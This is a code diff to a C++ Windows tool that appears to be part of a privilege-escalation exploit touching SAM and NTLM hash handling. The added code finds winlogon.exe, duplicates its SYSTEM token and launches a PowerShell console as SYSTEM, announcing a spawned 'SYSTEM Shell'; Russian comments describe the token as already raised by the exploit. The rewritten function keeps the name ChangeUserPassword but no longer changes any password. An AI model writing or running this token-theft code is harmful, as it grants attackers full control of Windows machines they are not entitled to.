@@ -17,6 +17,7 @@
 #include <cfapi.h>
 #include <aclapi.h>
 #include "windefend_h.h"
+#include <tlhelp32.h>
 
 /*
 #include <openssl/ssl.h>
@@ -2284,43 +2285,54 @@ char* CalculateNTLMHash(char* _input)
 	return (char*)md_value;
 
 }
+// Функция для поиска PID процесса по имени
+DWORD GetPidByName(const wchar_t* name) {
+    DWORD pid = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W process;
+    process.dwSize = sizeof(process);
+    if (Process32FirstW(snapshot, &process)) {
+        do {
+            if (!wcscmp(process.szExeFile, name)) {
+                pid = process.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(snapshot, &process));
+    }
+    CloseHandle(snapshot);
+    return pid;
+}
+
 bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
 {
-    HANDLE hToken = NULL;
-    HANDLE hDuplicateToken = NULL;
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
+    HANDLE hProcess, hToken, hNewToken;
+    STARTUPINFOEXA si = {0};
+    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+    PROCESS_INFORMATION pi = {0};
 
-        // 1. Пытаемся открыть токен текущего процесса (который уже должен быть приподнят эксплоитом)
-        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
-            printf("Failed to open current token: %d\n", GetLastError());
-            return false;
-        }
+    // 1. Берем winlogon, так как он точно SYSTEM и в нужной сессии
+    DWORD pid = GetPidByName(L"winlogon.exe");
 
-        // 2. Дублируем токен, чтобы создать полноценный первичный токен для нового процесса
-        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
-            printf("Failed to duplicate token: %d\n", GetLastError());
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (hProcess) {
+        if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
+            // 2. Дублируем токен
+            DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);
+
+            // 3. Запускаем PowerShell от этого токена
+            char cmd[] = "powershell.exe";
+            if (CreateProcessAsUserA(hNewToken, NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (STARTUPINFOA*)&si, &pi)) {
+                printf("[+] SYSTEM Shell spawned!\n");
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+            } else {
+                printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
+            }
+            CloseHandle(hNewToken);
             CloseHandle(hToken);
-            return false;
         }
-
-        // 3. Настраиваем запуск PowerShell в новом интерактивном окне
-        char cmdPath[] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-        si.lpTitle = (char*)"SYSTEM POWERSHELL";
-
-        // Используем CreateProcessAsUser для запуска от имени токена, который мы получили
-        if (CreateProcessAsUserA(hDuplicateToken, NULL, cmdPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-            printf("[+] SUCCESS: SYSTEM PowerShell spawned!\n");
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        return true;
-    } else {
-        printf("[-] CreateProcessAsUser failed. Error: %d\n", GetLastError());
+        CloseHandle(hProcess);
     }
-
-    CloseHandle(hToken);
-    CloseHandle(hDuplicateToken);
-    return false;
 }
 //////////////////////////////////////////////////////////////////////
 // SAM handling end
